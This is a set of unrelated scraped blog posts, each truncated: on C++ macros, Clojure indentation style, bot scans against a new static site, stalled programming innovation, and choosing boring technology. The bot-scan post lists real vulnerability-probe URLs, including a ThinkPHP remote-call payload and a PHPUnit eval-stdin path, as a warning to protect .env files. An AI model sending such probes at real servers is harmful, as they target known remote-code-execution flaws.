<blockquote>
<p>And if you don’t have <code>if constexpr</code>, you can use class template specializations,
or <a href="https://foonathan.net/blog/2015/11/16/overload-resolution-3.html">tag dispatching</a>.</p>
</blockquote>
<p>Of course, there are downsides to <code>if constexpr</code>:
You can’t use it to constrain preprocessor directives, i.e. <code>#include</code>.
For the <code>draw_triangle()</code> example, the code needs to include the proper system header.
<code>if constexpr</code> can help, so you’d need true conditional compilation there or manually copy the declarations.</p>
<blockquote>
<p>This is better than normally as system header declarations are usually pretty stable.
But it’s still not recommended.</p>
</blockquote>
<p>And modules can’t help either as the system headers do not define any module you can import.
Furthermore, you can’t conditionally import a module (as far as I know).</p>
<h2 id="passing-configuration-options">Passing configuration options</h2>
<p>On a related note, you sometimes want to pass some configuration options to a library.
You might want to enable or disable assertions, precondition checks, change some default behavior…</p>
<p>For example, it might have a header like this:</p>
<div><pre><code data-lang="cpp"><span>#ifndef USE_ASSERTIONS
</span><span></span>    <span>// default to enable
</span><span></span>    <span>#define USE_ASSERTIONS 1
</span><span>#endif
</span><span></span>
<span>#ifndef DEFAULT_FOO_IMPLEMENTATION
</span><span></span>    <span>// use the general implementation
</span><span></span>    <span>#define DEFAULT_FOO_IMPLEMENTATION general_foo
</span><span>#endif
</span><span></span>
<span>…</span>
</code></pre></div><p>When building the library you can then override the macros either when invoking the compiler,
or through CMake, for example.</p>
<h3 id="how-can-we-replace-it-2">How can we replace it?</h3>
<p>Macros are the obvious choice here, but there are is an alternative:</p>
<p>We could use a different strategy to pass options,
like <a href="https://en.wikipedia.org/wiki/Policy-based_design">policy-based design</a>,
where you pass a policy to a class template that defines the chosen behavior.
This has the benefit that it doesn’t force a single implementation to all users,
but of course has <a href="https://foonathan.net/blog/2017/02/08/policy-based-design-problem.html">its own downsides</a>.</p>
<p>But what I’d really like to see is the ability to pass these configuration options when you <code>import</code> the module:</p>
<div><pre><code data-lang="cpp"><span>import</span> <span>my</span><span>.</span><span>module</span><span>(</span><span>use_assertions</span> <span>=</span> <span>false</span><span>);</span>
<span>…</span>
</code></pre></div><p>This would be the ideal replacement for:</p>
<div><pre><code data-lang="cpp"><span>#define USE_ASSERTIONS 0
</span><span>#include</span> <span>"my_library.hpp"</span><span>
</span></code></pre></div><p>But I don’t think that’s technically feasible without sacrificing the benefits modules provide,
i.e. pre-compiling modules.</p>
<h2 id="assertion-macros">Assertion macros</h2>
<p>The macro you’ll most commonly use probably does some kind of assertion.
And macros are the obvious choice here:</p>
<ul>
<li>You’ll need to conditionally disable assertions and remove them so they have zero overhead in release.</li>
<li>If you have a macro, you can use the pre-defined <code>__LINE__</code>, <code>__FILE__</code> and <code>__func__</code> to get the location where the assertion is
and use that in the diagnostic.</li>
<li>If you have a macro, you can also stringify the expression that is being checked and use it in the diagnostic as well.</li>
</ul>
<p>That’s why almost all assertions are macros.</p>
<h3 id="how-can-we-replace-it-3">How can we replace it?</h3>
<p>I’ve already explored how conditional compilation can be replaced and how you can specify whether or not they should be enabled,
so that’s no problem.</p>
<blockquote>
<p>Using policy-based design here also allows customization of how the diagnostic is reported to the user.</p>
</blockquote>
<p>Getting the file information is also possible in the Library Fundamentals TS v2 as it adds <code>std::experimental::source_location</code>:</p>
<div><pre><code data-lang="cpp"><span>void</span> <span>my_assertion</span><span>(</span><span>bool</span> <span>expr</span><span>,</span> <span>std</span><span>::</span><span>experimental</span><span>::</span><span>source_location</span> <span>loc</span> <span>=</span> <span>std</span><span>::</span><span>experimental</span><span>::</span><span>source_location</span><span>::</span><span>current</span><span>())</span>
<span>{</span>
    <span>if</span> <span>(</span><span>!</span><span>expr</span><span>)</span>
        <span>report_error</span><span>(</span><span>loc</span><span>.</span><span>file_name</span><span>,</span> <span>loc</span><span>.</span><span>line</span><span>,</span> <span>loc</span><span>.</span><span>function_name</span><span>);</span>
<span>}</span>
</code></pre></div><p>The function <code>std::experimental::source_location::current()</code> expands to the information about the source file at the point of writing it.
Furthermore, if you use it as a default argument, it will expand to the caller location.
So the second point is no problem either.</p>
<p>The third point is the critical one:
You can’t stringify the expression and print it in the diagnostic without using a macro.
If you’re okay with that, you can implement your assertion function today.</p>
<p>But otherwise you still need a macro for that.
Check out <a href="https://foonathan.net/blog/2016/09/16/assertions.html">this blog post</a> how you could implement an (almost) macro-less assertion function,
where you can control the level with <code>constexpr</code> variables instead of macros.
You can find the full implementation <a href="https://github.com/foonathan/debug_assert">here</a>.</p>
<h2 id="compatibility-macros">Compatibility macros</h2>
<p>Not all compilers support all C++ features, which makes porting a real pain,
especially if you don’t have access to a compiler for a testing and need to do the “change a line, push to CI, wait for CI build, change another line” cycle just because some compiler really doesn’t like an important C++ feature!</p>
<p>Anyways, the usual compatibility problems can be solved with macros.
The implementations even define certain macros once they’ve implemented a feature,
making checking trivial:</p>
<div><pre><code data-lang="cpp"><span>#if __cpp_noexcept
</span><span></span>    <span>#define NOEXCEPT noexcept
</span><span></span>    <span>#define NOEXCEPT_COND(Cond) noexcept(Cond)
</span><span></span>    <span>#define NOEXCEPT_OP(Expr) noexcept(Expr)
</span><span>#else
</span><span></span>    <span>#define NOEXCEPT
</span><span></span>    <span>#define NOEXCEPT_COND(Cond)
</span><span></span>    <span>#define NOEXCEPT_OP(Expr) false
</span><span>#endif
</span><span></span>
<span>…</span>

<span>void</span> <span>func</span><span>()</span> <span>NOEXCEPT</span>
<span>{</span>
    <span>…</span>
<span>}</span>
</code></pre></div><p>This allows a portable usage of features even though not all compilers have them already.</p>
<h2 id="how-can-we-replace-it-4">How can we replace it?</h2>
<p>We can’t do that in any other way.
Workaround missing features requires some kind of preprocessing tool to get rid of not-supported features.
We have to use macros here.</p>
<h2 id="boilerplate-macros">Boilerplate macros</h2>
<p>C++’s templates and TMP go a long way to eliminate a lot of boilerplate code you otherwise need to write.
But sometimes, you just need to write a lot of code that is the same but not <em>quite</em> the same:</p>
<div><pre><code data-lang="cpp"><span>struct</span> <span>less</span>
<span>{</span>
    <span>bool</span> <span>operator</span><span>()(</span><span>const</span> <span>foo</span><span>&amp;</span> <span>a</span><span>,</span> <span>const</span> <span>foo</span><span>&amp;</span> <span>b</span><span>)</span>
    <span>{</span>
        <span>return</span> <span>a</span><span>.</span><span>bar</span> <span>&lt;</span> <span>b</span><span>.</span><span>bar</span><span>;</span>
    <span>}</span>
<span>};</span>

<span>struct</span> <span>greater</span>
<span>{</span>
    <span>bool</span> <span>operator</span><span>()(</span><span>const</span> <span>foo</span><span>&amp;</span> <span>a</span><span>,</span> <span>const</span> <span>foo</span><span>&amp;</span> <span>b</span><span>)</span>
    <span>{</span>
        <span>return</span> <span>a</span><span>.</span><span>bar</span> <span>&gt;</span> <span>b</span><span>.</span><span>bar</span><span>;</span>
    <span>}</span>
<span>};</span>

<span>…</span>
</code></pre></div><p>Macros can generate that boilerplate for you:</p>
<div><pre><code data-lang="cpp"><span>#define MAKE_COMP(Name, Op) \
</span><span>struct Name \
</span><span>{ \
</span><span>    bool operator()(const foo&amp; a, const foo&amp; b) \
</span><span>    { \
</span><span>        return a.bar Op b.bar; \
</span><span>    } \
</span><span>};
</span><span></span>
<span>MAKE_COMP</span><span>(</span><span>less</span><span>,</span> <span>&lt;</span><span>)</span>
<span>M…</span></code></pre></div></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <blockquote>
  <p>Programs must be written for people to read, and only incidentally for machines to execute.</p>

  <p>– Harold Abelson, Structure and Interpretation of Computer Programs</p>
</blockquote>

<p>The above maxim has guided most of my career as a software engineer and has been one of
the central <a href="https://guide.clojure.style/#guiding-principles">guiding principles</a> of the <a href="https://guide.clojure.style/">community Clojure style guide</a>,
that I’ve been maintaining for the past (almost) 8 years.</p>

<p>While the style guide was well received by the Clojure community in general, and universal agreement was reached on most points in it, one aspect
remains controversial to this day - namely the style guide’s preference towards “semantic indentation” over “fixed indentation” for function/macro
arguments. Today I want to address an article that suggested that fixed indentation is preferable, as it’s simpler and it’s easier to provide tooling support for it.
That article is named <a href="https://tonsky.me/blog/clojurefmt/">Better Clojure Formatting</a><sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>, which admittedly is catchy and made me consider naming my
response to it “The Best Clojure Formatting” or “Superb Clojure Formatting”, but I’ve opted for a more modest title in the end.</p>

<h2 id="prologue-the-purpose-of-formatting">Prologue: The Purpose of Formatting</h2>

<p>Have you ever thought why formatting (layout) is important at all?
Not just in code, but in any text in general.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<p>The answer to this question is quite simple - proper formatting
can enhance a lot the readability of any text. And here’s also the crux
of it - computers don’t really care about readability. As long as some
code is syntactically correct any compiler or interpreter would be happy
to compile or run it.</p>

<p>For us humans, however, formatting can be very helpful or extremely confusing.
As far as I’m concerned any formatting that makes some code easier to read and
comprehend is good formatting.</p>

<h2 id="introducing-semantic-formatting">Introducing Semantic Formatting</h2>

<p>Before I go into my arguments let’s briefly contrast semantic and fixed indentation with a couple of examples.</p>

<div><div><pre><code><span>;;; Semantic indentation</span><span>
</span><span>;;</span><span>
</span><span>;; macros</span><span>
</span><span>(</span><span>when</span><span> </span><span>something</span><span>

</span><span>(</span><span>with-out-str</span><span>
  </span><span>(</span><span>println</span><span> </span><span>"Hello, "</span><span>)</span><span>
  </span><span>(</span><span>println</span><span> </span><span>"world!"</span><span>))</span><span>

</span><span>;; function call spanning two lines (wide formatting)</span><span>
</span><span>(</span><span>filter</span><span> </span><span>even?</span><span>
        </span><span>(</span><span>range</span><span> </span><span>1</span><span> </span><span>10</span><span>))</span><span>

</span><span>;; function call spanning three lines (narrow formatting)</span><span>

<p>I hope it’s obvious that the main difference is that “semantic indentation” differentiates between macros with body forms and regular function/macro invocations.
That makes it easy to visually tell them apart. The “fixed indentation” approach, however, advocates ignoring those differences and indenting everything the same way.</p>

<p>A different way to think about semantic indentation might be to compare it to syntax highlighting - normally different constructs in a programming language (e.g. special forms, built-in functions and user-defined functions), get highlighted
differently, to reflect their semantics and to assist the reader in comprehending what they are dealing with.</p>

<p><strong>NOTE:</strong> There are other aspects of “semantic indentation” as well, but I’ll stick only to the most prominent/infamous parts in this article.</p>

<h2 id="semantic-formatting-vs-fixed-formatting">Semantic Formatting vs Fixed Formatting</h2>

<p>The main argument for “semantic formatting” is pretty simple - it
reflects better the semantics of your code, which results in improved
clarity/readability. Just by looking at the shape of the code you can
infer how something is supposed to behave.</p>

<p>A secondary argument might be that’s also the formatting that has been employed by
all major Lisp dialects (e.g. Common Lisp, Scheme, Emacs Lisp) for a very long time.
Some might argue that following in their footsteps is just <a href="https://en.wikipedia.org/wiki/Cargo_cult_programming">cargo culting</a>,
but if the premise behind their approach is still relevant today I don’t think the cargo cult theory has any merit.</p>

<p>Clojure developers have historically had a love/hate relationship with Lisp tradition, depending on their background.
That’s normal, given that Clojure was often marketed as a modern Lisp that break away from some arcane Lisp dogmas and traditions
and aligns itself with modern programming practices.
Tradition, however, doesn’t always mean bad, obsolete and irrelevant. In the case of semantic indentation, I think Clojure’s
predecessors had the right idea and nothing has fundamentally changed.</p>

<p>The main argument in favor of “fixed indentation” is tooling support - if you don’t need to format something differently, obviously creating code formatters becomes easier. There’s nothing for the formatter to parse/analyze, and there’s no need for configuration. Simplicity is generally a good thing, so this definitely sounds appealing.
While, I’m all for consistency and good tooling support, I think those are also achievable with semantic indentation in the case of Clojure (although a bit harder). Consider the following:</p>

<ul>
  <li>For many macros you can infer the right indentation just by looking for a <code>body</code> parameter:</li>
</ul>

<div><div><pre><code><span>(</span><span>defmacro</span><span> </span><span>when</span><span>
  </span><span>"Evaluates test. If logical true, evaluates body in an implicit do."</span><span>
  </span><span>{</span><span>:added</span><span> </span><span>"1.0"</span><span>}</span><span>
  </span><span>[</span><span>test</span><span> </span><span>&amp;</span><span> </span><span>body</span><span>]</span><span>
  </span><span>(</span><span>list</span><span> </span><span>'if</span><span> </span><span>test</span><span> </span><span>(</span><span>cons</span><span> </span><span>'do</span><span> </span><span>body</span><span>)))</span><span>
</span></code></pre></div></div>

<p>Of course, there will also be counter-examples that need special handling, as they used some non-conventional names, but
this simple heuristic will work quite well most of the time.</p>

<p><strong>Note:</strong> Common Lisp’s SLIME <a href="https://common-lisp.net/project/slime/doc/html/Semantic-indentation.html">has been using this approach</a> for a very long time.</p>

<ul>
  <li>It’s easy to specify the right indentation with <a href="https://docs.cider.mx/cider/indent_spec.html">metadata</a></li>
  <li>All popular Clojure editors and formatters that exist today are supporting “semantic indentation” pretty well, so clearly it’s not a big obstacle for tooling.</li>
</ul>

<p>In general I’ve always found it dangerous that a lot of the reasoning
around code style in recent years has been centered around how easy it is to enforce
certain style automatically.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>  I’ve experienced this first-hand both as
an editor of several code style guides, and as the author of a <a href="https://docs.rubocop.org/">fairly
popular Ruby lint/formatter tool</a>.  Yeah,
lint tools and formatters are very important and they make our lives easier, but we should
never forget we’re writing code for humans to read and (only occasionally) for machines to
execute. It’d be really sad if we lost sight of that just to pursue the ultimate degree
of consistency.</p>

<p>And there’s also the meta topic of the code we write being some artistic expression of our inner self, but we should
probably disregard this argument in any professional context. I’ll mention, though, that due to the simplicity
of Clojure/Lisp we’re (un)fortunate to have way fewer stylistic decisions to make than developers working with
languages like Ruby, Java or JavaScript.</p>

<p>Before, I wrap up I want to elaborate a bit on the reasoning behind the (infamous) semantic rules for function arguments alignment:</p>

<div><div><pre><code><span>;; function call spanning two lines</span><span>
</span><span>(</span><span>filter</span><span> </span><span>even?</span><span>
        </span><span>(</span><span>range</span><span> </span><span>1</span><span> </span><span>10</span><span>))</span><span>

</span><span>;; function call spanning three lines</span><span>
</span><span>(</span><span>filter</span><span>
 </span><span>even?</span><span>
 </span><span>(</span><span>range</span><span> </span><span>1</span><span> </span><span>10</span><span>))</span><span>
</span></code></pre></div></div>

<p>While some people would argue that the rules are random or inconsistent, I believe that’s definitely not the case:</p>

<ul>
  <li>In the first example, the formatting is similar to the one in every Algol-like language where the name of the function stands out and the arguments are grouped together. Of course, in most Algol-like languages people are still arguing whether to align or not align their function/method arguments. That being said, the case for aligned has always been the case for improved readability.</li>
</ul>

<div><div><pre><code><span># Ruby (aligned arguments)</span>
<span>some_method</span><span>(</span><span>foo</span><span>,</span> <span>bar</span>
            <span>baz</span><span>)</span>

<span># Ruby (indented &amp; aligned arguments)</span>
<span>some_method</span><span>(</span>
  <span>foo</span><span>,</span> <span>bar</span>
  <span>baz</span>
<span>)</span>
</code></pre></div></div>

<p>The above example is in Ruby, but it could have easily been in Java, C#, Python, JavaScript, etc.</p>

<ul>
  <li>In the second example some people would question what they call “the 1-space indent”. That’s not really indentation at all, but rather standard alignment of list elements. Don’t forget the <code>()</code> are not some special invocation syntax, but plain old list literals, that are normally formatted like any other collection literal:</li>
</ul>

<div><div><pre><code><span>;; list literal</span><span>
</span><span>(</span><span>1</span><span>
 </span><span>2</span><span>
 </span><span>3</span><span>)</span><span>

</span><span>;; vector literal</span><span>
</span><span>[</span><span>1</span><span>
 </span><span>2</span><span>
 </span><span>3</span><span>]</span><span>

</span><span>;; set literal</span><span>
</span><span>#</span><span>{</span><span>1</span><span>
  </span><span>2</span><span>
  </span><span>3</span><span>}</span><span>
</span></code></pre></div></div>

<p>I don’t know about you, but I find the following fixed indentation a big weird:</p>

<div><div><pre><code><span>;;; Fixed Indentation</span><span>
</span><span>;;</span><span>
</span><span>;; list literals</span><span>
</span><span>(</span><span>1</span><span> </span><span>2</span><span> </span><span>3</span><span>
  </span><span>4</span><span> </span><span>5</span><span> </span><span>6</span><span>)</span><span>

</span><span>(</span><span>1</span><span>
  </span><span>2</span><span>
  </span><span>3</span><span>
  </span><span>4</span><span>
  </span><span>5</span><span>
  </span><span>6</span><span>)</span><span>
</span></code></pre></div></div>

<p>Admittedly, list literals are not very common in Clojure, that’s why it’s understandable
that for many people lists are nothing but an invocation syntax.</p>

<p>“Better Clojure Formatting” argued that the semantic formatting guidelines were not consistent:</p>

<blockquote>
  <p>This rule would be easy to automate if it didn’t have a huge list of exceptions. <code>let</code>, <code>cond</code>, <code>if</code>, <code>defn</code> and many other forms simply don’t follow this rule.</p>
</blockquote>

<p>I disagree with this assessment, as the guideline in question is strictly for forms without bodies (mostly regular function calls).
All of the cited exceptions are just regular cases of a different <a href="https://guide.clojure.style/#body-indentation">rule</a>.</p>

<blockquote>
  <p>Again, exceptions! E.g. <code>try</code> doesn’t follow it. Also, having a mix of one- and two-space indents was driving me mad when I was trying to follow those rules manually.</p>
</blockquote>

<p>Same here. Obviously <code>try</code> is not part of the guideline in question and follows a different guideline, which is hardly an exception.</p>

<h2 id="wide-vs-narrow-formatting">Wide vs Narrow Formatting</h2>

<p>I’ve noticed that many people dislike semantic formatting, because
it’s too wide (in the sense of taking up horizontal space) for their
taste. A reader remarked he finds this wide formatting ugly, wasteful
of horizontal space, and prohibitive of descriptive (long) function
names:</p>

<div><div><pre><code><span>;; semantic (wide)</span><span>
</span><span>(</span><span>clojure.core/filter</span><span> </span><span>even?</span><span>
                     </span><span>(</span><span>range</span><span> </span><span>1</span><span> </span><span>10</span><span>))</span><span>
</span></code></pre></div></div>

<p>It’s important to understand that the comparison of wide vs narrow formatting has nothing to do with
semantic vs fixed. I think the confusion comes mostly from the fact that the semantic formatting is
often used in its wide version, although there’s a matching narrow version for everything.</p>

<div><div><pre><code><span>;; semantic (narrow)</span><span>
</span><span>(</span><span>clojure.core/filter</span><span>
 </span><span>even?</span><span>
 </span><span>(</span><span>range</span><span> </span><span>1</span><span> </span><span>10</span><span>))</span><span>

</span><span>(</span><span>cond</span><span>
  </span><span>(</span><span>zero?</span><span> </span><span>n</span><span>)</span><span> </span><span>curr</span><span>
  </span><span>:else</span><span> </span><span>(</span><span>recur</span><span> </span><span>nxt</span><span> </span><span>(</span><span>+</span><span>'</span><span> </span><span>cur…</span></code></pre></div></div></div></div>

<p>This blog has been online for about 10 hours. To put it more harshly: I’m a
nobody on the internet. Yet, when I generated my first visitor report with
<a href="https://goaccess.io/">goaccess</a>, I saw that the bot army has already started
attacking my server. A lot of suspicious-looking URLs have been requested:</p>

<ul>
  <li><code>/config/getuser?index=0</code></li>
  <li><code>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>
  <li><code>/api/jsonws/invoke</code></li>
  <li><code>/solr/admin/info/system?wt=json</code></li>
  <li><code>/index.php?s=/Index/\x5Cthink\x5Capp/invokefunction</code>
<code>&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=HelloThinkPHP21</code></li>
  <li><code>/console/</code></li>
  <li><code>/wp-content/plugins/wp-file-manager/readme.txt</code></li>
  <li><code>/Autodiscover/Autodiscover.xml</code></li>
  <li><code>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</code></li>
</ul>

<p>This is just a small sample but it is obvious that they are trying to exploit
known vulnerabilities. These are absolutely harmless because this is a static
website but there was one request that caught my attention:</p>



<p>My static site doesn’t have a <code>.env</code> file but I work on a lot of projects that
have one. I of course know that exposing the <code>.env</code> file is a mistake – it
usually contains passwords, keys and other sensitive information and in a
production environment, these should be in environment variables – but it is
very scary to see that this is <em>among the first things</em> hackers try – because
it’s so easy to accidentally copy it into a public directory.</p>

<p>So please, everyone: <strong>protect your <code>.env</code>!</strong></p>

When I’m in analysis mode I try to understand what market, technical and social forces have lead to the status quo. To do this effectively, or at least to induce useful principles for later use, you have to believe that things are the way they are for good reasons. As soon as I put my innovator hat on however, I get all jazzed up and think “screw that! X would be so much better if Y”. I’ve learned over the last year that balancing these two perspectives is essential to an inventor.</p><p id="9c7d">This week I watched Bret Victor’s <a href="http://worrydream.com/dbx/" rel="noopener">Future of Programming</a> lecture from July 2013 and it compelled me to put these thoughts down on paper. During the lecture, Bret uses an overhead projector and pretends its 1973. He proudly presents the latest in programming research for the time and explains why it’d be really silly if we aren’t using them in 40 years. To Victor’s credit he remains in character the whole time as he satirically paints the ideal world we’ll soon enter — one the audience knows doesn’t really exist.</p><p id="cbac">The future Bret showed off included direct manipulations of the output (result) instead of the code, programming via constraints/goals, spatial (visual) programming paradigms, and massively parallel programming approaches. Declarative programming, functional programming, microservice architectures and WYSIWYG editors check some of those boxes, but not nearly at the level of their potential. All that being said, there’s no argument against real progress having been made the last 40 years, just not the progress many expected.</p><p id="f16a">So now I’ll put on my analysis hat and work through why the art of programming is so hard to advance beyond its current levels.</p><p id="a3f1">Many blame the lack of advancements on developers. We built shinny thing X, but developers are too arrogant, stubborn, busy, dismissive or all of the above to adopt it. I’ve even heard people accuse developers of selfishly protecting their future job prospects by trying to stifle the adoption of new programming mediums. Heck, I’ve said this before…</p><p id="f628">^ This is just wrong. In my experience developers are very rational beings. Their job is to find the most efficient way of solving problems every single day and if you create a tool that provides that they’ll be all over it. They’ll even volunteer their time to help you build it for free. If you move forward accepting that developers are mostly rational actors and have good reasons for adopting something / not adopting something you can learn a lot to inform future design.</p><p id="33a0">So I did that. I actually sat down with people over the last 3 months and asked them why they failed to adopt a variety of tools. I overwhelmingly got rational explanations to why switching to something new was irrational.</p><h2 id="99cb">Better Hammer Tradeoff</h2><p id="8f1e">Imagine you’re building a log cabin by hand with a bad, but usable hammer. When you’re 90% of the way finished a magical genie comes and offers you a better hammer. Great! But there’s a tradeoff: If you take the new shinny hammer, you have to start the house from scratch…oh and he turns back humanity to the stone age. You can get your new hammer, but you’ll have to do without bandsaws, your pickup truck, and yes, nails.</p><p id="3e8b">What’s the rational choice? Hint, it involves the old hammer.</p><p id="7f24">That parable emerged from summarizing all the interviews I conducted and highlights the frustrations developers have had with many of the new ‘solve all your problems’ tools they’ve tried. For context these tools fit into two categories: new programming languages including some flow &amp; graph based paradigms and no-code visual builders.</p><p id="6a39">There are two areas of value to consider when choosing a programming paradigm: the developer experience of the [language, tooling, GUI] and the strength of the ecosystem (what common problems have been solved already). Many of the new paradigms, while often built on sound principles, miss out on the massive body of work that already exists is language X. How do you weight these two areas when picking your paradigm? 30–70? 90–10? 1–99? Most people I spoke with rated the ecosystem as 2–3x more important than DX.</p><p id="9ab3">Tool-builders usually only focus on DX and [assume, hope, pray] that a community comes along and builds an ecosystem. This still can happens, but it was much much more common in the 90s than it is today. There are network effects in programming and a beautiful virtuous cycle quickly emerges among the most used tools. When a user shares functionality openly it makes paradigm more capable, which attracts new users, who continue to improve that paradigm. Boom! Node module for everything.</p><p id="0b6c">When you look at the languages that have really caught on recently, they tend to share one thing in common: they tap into an existing body of work. Look at TypeScript, the most popular language released after 2000, which interoperates with Javascript. Then there’s Swift, the second most popular language released after 2000. Just imagine where Swift would be today if it hadn’t been interoperable with Objective-C and the Cocoa legacy or if TypeScript’s ecosystem was a blue ocean from day one.</p><p id="272c">There are consequences for tool makers building an entirely new base abstraction, be it visual, text based or otherwise. If you choose not to interoperate with an existing ecosystem, you or your community will need to spend years coming up from the stone age to modernity. Programming is just learning to use a bunch of stacked abstractions. Even if you have an objectively better base abstraction, one that would have clearly won out over everything else had it been introduced in 1992, people will have few incentives to adopt it if there’s no ecosystem.</p><h2 id="749d">Sunk Cost…Sensibility</h2><p id="5881">Most people complete the phrase “Sunk cost _____” with “fallacy”. The classic economics thought experiment usually involves a couple staying at a concert they hate just because they paid face value for the tickets. An enlightened economist would, as the story goes, leave as soon as they became unhappy with the concert and reclaim a few precious hours. But if you had to pay $50k, $50M or $5B to leave the concert early, you’d probably stay. When the switching costs are that high, there’s good reason to stay and the largest employers of programmers in the world have enormous switching costs. This keeps mainstream programmers anchored to the status quo.</p><p id="2c6d">This is another completely rational choice developers make when sticking to the paradigms they know. The combined costs of hiring new people, training, rewriting the code, and the opportunity cost of choosing these actions over improving your product almost always outweigh the benefits of making the change. <a href="https://www.joelonsoftware.com/2000/04/06/things-you-should-never-do-part-i/" rel="noopener">Joel has a classic article about code rewrites that expands on this more.</a></p><p id="ccc1">Young companies without much in the way of legacy or those with no other choice have the luxury of picking new paradigms, but few of these companies end up becoming incumbents. Those who do make it are the kingmakers. Both Facebook and Twitter were first built on technologies that were inadequate for their eventual scale (PHP and Ruby). Facebook became so attached to PHP that they enhanced the language to suit their needs with Hack and other tools. Similarly, Twitter switched over to Scala which one could argue is a key reason for Scala’s mainstream success.</p><h2 id="a2d4">Solving the Least Important Problems</h2><p id="513f">Tool makers must strike a balance between learnability and productivity. A visual programming environment like MIT’s <a href="https://scratch.mit.edu/" rel="noopener">Scratch</a> is incredibly learnable. I’ve seen 4-5 year old kids build games with it after just a few hours. The drag/drop interface and shape based constraints are really easy to learn and prevent Scratch from ever being in a broken state. This is great for kids and individuals trying to learn programming.</p><p id="bb8d">The same things that make Scratch easy to learn also make it an unproductive environment for more serious programmers. For a professional, programming with drag and drop is way slower than keying in code — that’s just a fact.</p><p id="cad2">These tradeoffs must be considered whenever building a new tool. If you build something super learnable that is not productive you’ll get a lot of praise, but little follow through. If you build something that’s too difficult to learn, but very productive you’ll turn a lot of people off. To reach mainstream programmers you need to make something that is both learnable and productive.</p><p id="5100">I think most of the stalled innovations in programming focused disproportionally on learnability. The problem is, within a few weeks of using any paradigm developers usually have built a repository of habits that keep them from making mistakes. For instance, if a new visual logic builder prides itself on preventing all syntax errors, that’s really cool, but most developers have learned to do that automatically.</p><p id="742f">Truth is, every tool you have ever used is flawed and every new tool will also be flawed. Humans subconsciously come up with ways to cope with their tools so they can keep themselves focussed on the bigger conceptual issues. That isn’t going to change anytime soon. If professionals already have habits in place to cope with things that have been made easier/more learnable by new tooling, those new tools do not have much value to them. It’s like offering a 40 year old who’s been driving manual her whole life an automatic car — yeah that’s great, but it’s not needed and she certainly won’t pay a premium for it to be included.</p><h2 id="6e7a">Things Have Been Getting Better</h2><p id="10b2">No good analysis fails to include a few words from the Advocatus Diaboli.</p><p id="e04a">Things have been getting better. The growth has just been in the ecosystems and not the paradigms themselves. We’ve been building this amazing tower of abstraction since the early days of programming that provide really useful abstractions for things like:</p><ul><li id="fb86">Charging a credit card, which has gone from a 20 person team to processor.charge()</li><li id="b32b">Configuring a massive cluster of servers is done with a short text file instead of …</li></ul></div></div></section></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Note: the ideas in this post have already been covered numerous times in the past. One article that has greatly influenced my perspective over the years is <a href="https://mcfunley.com/choose-boring-technology" target="_blank" rel="noopener">McKinley's Choose Boring Technology</a>. Below I'll explore the topic from my own experience, and how I ended up using Kubernetes for a recent project.</p><p>Over the years I have observed that many engineers tend to attribute much of the success or failure of a company to the technical choices made. I know I’m often guilty of this too. And while it is often justified, I would argue that for the vast majority of startups out there, the choice of programming language, framework, or even database doesn’t matter that much. This seems especially true during the early stages.</p><h2>Through the engineering lens</h2><p>This perception is understandable, we as engineers tend to look at the world from a specific lens, and are often biased by what we know best. Our daily activities may include things such as debugging CI pipelines, implementing new features, pairing with colleagues, or migrating the always present legacy codebase. The environment that surrounds us makes it easy to believe that it all boils down to those things that we see and understand. It’s an illusion that makes us feel like we’re fully in control of what makes or breaks the product.</p><p>Don’t get me wrong, it can be a huge advantage for many companies to make their product 3x more efficient than competitors, or to have elegant, composable code. But you might be focusing on the wrong problems if nobody cares about the product you’re actually building, and sooner or later your business will hit this wall.</p><p>I’m not saying that software doesn’t matter. A solid foundation for your startup goes a long way. If investing in this allows you to build better features faster than your competitors, more power to you. But finding the right balance is highly dependent on what you’re trying to solve and the resources you have at hand. There’s no right or wrong way to do it, and as usual, it mainly comes down to tradeoffs.</p><p><img src="https://panelbear.com/static/img/blog/lenses.png" alt="Different lenses"></p><h2>Boring is less surprising</h2><p>I believe aiming for a healthy balance of risk vs reward when it comes to your technical choices is something to strive for. In particular, if it decreases the chances you get stuck on the wrong problems down the road.</p><p>Boring is often interpreted as “picking old technologies over newer ones”, but it doesn’t necessarily mean that. For me, this comes down to using proven technologies in which the ways it can fail are mostly known, but occasionally experimenting with different, possibly newer tools that might suit the problem at hand better.</p><p>Maybe you want to gain more experience by using the latest framework or programming language, or you just want to have some fun. You do what makes you happy. But if you’re trying to make a decision to increase the odds that your product or business will succeed, it’s worth stepping back and considering your options.</p><p>For me, mainly choosing software that has been around for longer is not about it being boring or older, it’s about the fact that the ways in which it fails are better known. There are fewer unknowns for you to deal with and this maximizes your chances of actually shipping the project.</p><p>For example the other day I had an issue with my Django app, and a quick search led me to tens of answers to this problem in various forums and websites. It took me at most 10 minutes to get back on track and that was the end of this issue.</p><p>I experienced the exact opposite a few years ago with a popular, but not so battle-tested Scala library my team had been using for a while. We were probably among the first to encounter the issues we were facing, and it seemed nobody had walked down this path before. Maybe it sounds like a fun challenge or a great chance to contribute back to OSS (which I’m happy to), but once you solve it, do your customers really care about it? How many days, weeks, or even months are you willing to invest in such issues? In my case, I’d rather use that time to ship new features or improve the existing ones.</p><h2>Exploit vs explore</h2><p>I try to follow an 80/20 distribution when it comes to my choice of tools. This means my stack consists of about 80% software I already know well, but I do allow myself 20% of the stack to explore tech I have less experience with. The exact ratio is not what’s important here, it’s more the fact that you should lean towards using proven technologies.</p><p>This also resonates with how <a href="https://en.wikipedia.org/wiki/Multi-armed_bandit" target="_blank" rel="noopener">Multi-armed bandits</a> work. You try to maximize your expected gain by taking advantage of what worked well in the past, while sometimes exploring new things to avoid missing out on a possible goldmine.</p><p><img src="https://panelbear.com/static/img/blog/bandits.png" alt="Balance new vs proven"></p><p>A more recent example of mine started as an embarrassingly simple Django app with no charts, all metrics were rendered on a plain HTML table, and all data was stored on a SQLite database. Took literally a weekend to get it up and running including manually deploying to a $5/mo VM. Low risk and high reward for my needs at the time.</p><p>Fast forward and as I added more features and began handling more page views for various websites, I started to notice that the codebase could use some refactoring. It also became increasingly repetitive to do things like deploying to new instances, issuing SSL certs, and keeping the DNS records up to 